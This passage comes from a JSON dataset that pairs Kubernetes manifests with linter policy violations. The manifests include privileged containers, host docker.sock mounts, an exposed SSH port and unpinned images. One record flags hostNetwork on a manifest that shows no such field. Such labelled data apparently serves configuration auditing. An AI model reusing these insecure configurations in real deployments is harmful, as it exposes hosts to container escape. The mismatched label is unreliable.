    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"gpg-buildbox\" is using an invalid container image, \"gridpgadmin/gpg-buildbox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8468",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"gpg-local-registry\" is using an invalid container image, \"registry\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8469",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gpg-buildbox\" does not have a read-only root file system"
  },
  {
    "id": "8470",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gpg-local-registry\" does not have a read-only root file system"
  },
  {
    "id": "8471",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"gpg-buildbox\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "8472",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"gpg-buildbox\" is privileged"
  },
  {
    "id": "8473",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gpg-buildbox\" is not set to runAsNonRoot"
  },
  {
    "id": "8474",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gpg-local-registry\" is not set to runAsNonRoot"
  },
  {
    "id": "8475",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "ssh-port",
    "violation_text": "port 22 and protocol TCP in container \"gpg-buildbox\" found"
  },
  {
    "id": "8476",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gpg-buildbox\" has cpu request 0"
  },
  {
    "id": "8477",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gpg-local-registry\" has cpu request 0"
  },
  {
    "id": "8478",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gpg-buildbox\" has memory limit 0"
  },
  {
    "id": "8479",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gpg-local-registry\" has memory limit 0"
  },
  {
    "id": "8480",
    "manifest_path": "data/manifests/the_stack_sample/sample_3153.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2679\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8481",
    "manifest_path": "data/manifests/the_stack_sample/sample_3153.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2679\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8482",
    "manifest_path": "data/manifests/the_stack_sample/sample_3153.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2679\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8483",
    "manifest_path": "data/manifests/the_stack_sample/sample_3153.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2679\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8484",
    "manifest_path": "data/manifests/the_stack_sample/sample_3153.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2679\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8485",
    "manifest_path": "data/manifests/the_stack_sample/sample_3154.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: bl-db-image-service\n  namespace: index\n  labels:\n    name: bl-db-image\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 27017\n    targetPort: 27017\n    protocol: TCP\n  selector:\n    role: mongo\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[role:mongo])"
  },
  {
    "id": "8486",
    "manifest_path": "data/manifests/the_stack_sample/sample_3155.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-app\n  labels:\n    hello: universe\nspec:\n  containers:\n  - name: test-app\n    image: ubuntu:focal\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - sleep infinity\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-app\" does not have a read-only root file system"
  },
  {
    "id": "8487",
    "manifest_path": "data/manifests/the_stack_sample/sample_3155.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-app\n  labels:\n    hello: universe\nspec:\n  containers:\n  - name: test-app\n    image: ubuntu:focal\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - sleep infinity\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-app\" is not set to runAsNonRoot"
  },
  {
    "id": "8488",
    "manifest_path": "data/manifests/the_stack_sample/sample_3155.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-app\n  labels:\n    hello: universe\nspec:\n  containers:\n  - name: test-app\n    image: ubuntu:focal\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - sleep infinity\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-app\" has cpu request 0"
  },
  {
    "id": "8489",
    "manifest_path": "data/manifests/the_stack_sample/sample_3155.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-app\n  labels:\n    hello: universe\nspec:\n  containers:\n  - name: test-app\n    image: ubuntu:focal\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - sleep infinity\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-app\" has memory limit 0"
  },
  {
    "id": "8490",
    "manifest_path": "data/manifests/the_stack_sample/sample_3159.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: gcr.io/google_containers/hyperkube:v1.7.5\n    command:\n    - /hyperkube\n    - apiserver\n    - --advertise-address=10.0.0.10\n    - --etcd-servers=http://127.0.0.1:4001\n    - --service-cluster-ip-range=10.20.0.0/16\n    - --runtime-config=authorization.k8s.io/v1beta1=true\n    - --kubelet-preferred-address-types=Hostname,ExternalIP\n    - --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,ResourceQuota\n    - --cert-dir=/var/kubernetes/ssl\n    - --kubelet-client-certificate=/etc/kubernetes/ssl/kubelet-client.pem\n    - --kubelet-client-key=/etc/kubernetes/ssl/kubelet-client-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --tls-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --tls-cert-file=/etc/kubernetes/ssl/kube-apiserver-server.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/kube-apiserver-server-key.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/kube-apiserver-server-key.pem\n    - --basic-auth-file=/etc/kubernetes/ssl/basic_auth.csv\n    - --allow-privileged=true\n    - --anonymous-auth=false\n    - --storage-backend=etcd3\n    resources:\n      requests:\n        cpu: 100m\n    livenessProbe:\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 8080\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    ports:\n    - containerPort: 6443\n      hostPort: 6443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/ssl\n      name: srvkubessl\n      readOnly: true\n    - mountPath: /etc/kubernetes/kubeconfigs\n      name: etc-kubernetes-kubeconfigs\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: srvkubessl\n  - hostPath:\n      path: /etc/kubernetes/kubeconfigs\n    name: etc-kubernetes-kubeconfigs\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "8491",
    "manifest_path": "data/manifests/the_stack_sample/sample_3159.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: gcr.io/google_containers/hyperkube:v1.7.5\n    command:\n    - /hyperkube\n    - apiserver\n    - --advertise-address=10.0.0.10\n    - --etcd-servers=http://127.0.0.1:4001\n    - --service-cluster-ip-range=10.20.0.0/16\n    - --runtime-config=authorization.k8s.io/v1beta1=true\n    - --kubelet-preferred-address-types=Hostname,ExternalIP\n    - --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,ResourceQuota\n    - --cert-dir=/var/kubernetes/ssl\n    - --kubelet-client-certificate=/etc/kubernetes/ssl/kubelet-client.pem\n    - --kubelet-client-key=/etc/kubernetes/ssl/kubelet-client-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --tls-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --tls-cert-file=/etc/kubernetes/ssl/kube-apiserver-server.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/kube-apiserver-server-key.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/kube-apiserver-server-key.pem\n    - --basic-auth-file=/etc/kubernetes/ssl/basic_auth.csv\n    - --allow-privileged=true\n    - --anonymous-auth=false\n    - --storage-backend=etcd3\n    resources:\n      requests:\n        cpu: 100m\n    livenessProbe:\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 8080\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    ports:\n    - containerPort: 6443\n      hostPort: 6443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/ssl\n      name: srvkubessl\n      readOnly: true\n    - mountPath: /etc/kubernetes/kubeconfigs\n      name: etc-kubernetes-kubeconfigs\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: srvkubessl\n  - hostPath:\n      path: /etc/kubernetes/kubeconfigs\n    name: etc-kubernetes-kubeconfigs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-apiserver\" does not have a read-only root file system"
  },
  {
    "id": "8492",
    "manifest_path": "data/manifests/the_stack_sample/sample_3159.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: gcr.io/google_containers/hyperkube:v1.7.5\n    command:\n    - /hyperkube\n    - apiserver\n    - --advertise-address=10.0.0.10\n    - --etcd-servers=http://127.0.0.1:4001\n    - --service-cluster-ip-range=10.20.0.0/16\n    - --runtime-config=authorization.k8s.io/v1beta1=true\n    - --kubelet-preferred-address-types=Hostname,ExternalIP\n    - --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,ResourceQuota\n    - --cert-dir=/var/kubernetes/ssl\n    - --kubelet-client-certificate=/etc/kubernetes/ssl/kubelet-client.pem\n    - --kubelet-client-key=/etc/kubernetes/ssl/kubelet-client-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --tls-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --tls-cert-file=/etc/kubernetes/ssl/kube-apiserver-server.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/kube-apiserver-server-key.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/kube-apiserver-server-key.pem\n    - --basic-auth-file=/etc/kubernetes/ssl/basic_auth.csv\n    - --allow-privileged=true\n    - --anonymous-auth=false\n    - --storage-backend=etcd3\n    resources:\n      requests:\n        cpu: 100m\n    livenessProbe:\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 8080\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    ports:\n    - containerPort: 6443\n      hostPort: 6443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/ssl\n      name: srvkubessl\n      readOnly: true\n    - mountPath: /etc/kubernetes/kubeconfigs\n      name: etc-kubernetes-kubeconfigs\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: srvkubessl\n  - hostPath:\n      path: /etc/kubernetes/kubeconfigs\n    name: etc-kubernetes-kubeconfigs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-apiserver\" is not set to runAsNonRoot"
  },
  {
    "id": "8493",
    "manifest_path": "data/manifests/the_stack_sample/sample_3159.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: gcr.io/google_containers/hyperkube:v1.7.5\n    command:\n    - /hyperkube\n    - apiserver\n    - --advertise-address=10.0.0.10\n    - --etcd-servers=http://127.0.0.1:4001\n    - --service-cluster-ip-range=10.20.0.0/16\n    - --runtime-config=authorization.k8s.io/v1beta1=true\n    - --kubelet-preferred-address-types=Hostname,ExternalIP\n    - --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,ResourceQuota\n    - --cert-dir=/var/kubernetes/ssl\n    - --kubelet-client-certificate=/etc/kubernetes/ssl/kubelet-client.pem\n    - --kubelet-client-key=/etc/kubernetes/ssl/kubelet-client-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --tls-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --tls-cert-file=/etc/kubernetes/ssl/kube-apiserver-server.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/kube-apiserver-server-key.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/kube-apiserver-server-key.pem\n    - --basic-auth-file=/etc/kubernetes/ssl/basic_auth.csv\n    - --allow-privileged=true\n    - --anonymous-auth=false\n    - --storage-backend=etcd3\n    resources:\n      requests:\n        cpu: 100m\n    livenessProbe:\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 8080\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    ports:\n    - containerPort: 6443\n      hostPort: 6443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/ssl\n      name: srvkubessl\n      readOnly: true\n    - mountPath: /etc/kubernetes/kubeconfigs\n      name: etc-kubernetes-kubeconfigs\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: srvkubessl\n  - hostPath:\n      path: /etc/kubernetes/kubeconfigs\n    name: etc-kubernetes-kubeconfigs\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-apiserver\" has memory limit 0"
  },
  {
    "id": "8494",
    "manifest_path": "data/manifests/the_stack_sample/sample_3160.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    command:\n    - kube-apiserver\n    args:\n    - --insecure-port=0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"command-demo-container\" does not have a read-only root file system"
  },
  {
    "id": "8495",
    "manifest_path": "data/manifests/the_stack_sample/sample_3160.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    command:\n    - kube-apiserver\n    args:\n    - --insecure-port=0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"command-demo-container\" is not set to runAsNonRoot"
  },
  {
    "id": "8496",
    "manifest_path": "data/manifests/the_stack_sample/sample_3160.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    command:\n    - kube-apiserver\n    args:\n    - --insecure-port=0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"command-demo-container\" has cpu request 0"
  },
  {
    "id": "8497",
    "manifest_path": "data/manifests/the_stack_sample/sample_3160.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    command:\n    - kube-apiserver\n    args:\n    - --insecure-port=0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"command-demo-container\" has memory limit 0"
  },
  {
    "id": "8498",
    "manifest_path": "data/manifests/the_stack_sample/sample_3161.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\nspec:\n  type: NodePort\n  ports:\n  - name: tcp-pg\n    port: 5432\n    targetPort: tcp-pg\n    nodePort: 31432\n  selector:\n    app: postgres\n    role: master\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:postgres role:master])"
  },
  {
    "id": "8499",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "docker-sock",
    "violation_text": "host system directory \"/var/run/docker.sock\" is mounted on container \"openvino-benchmark-job\""
  },
  {
    "id": "8500",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "job-ttl-seconds-after-finished",
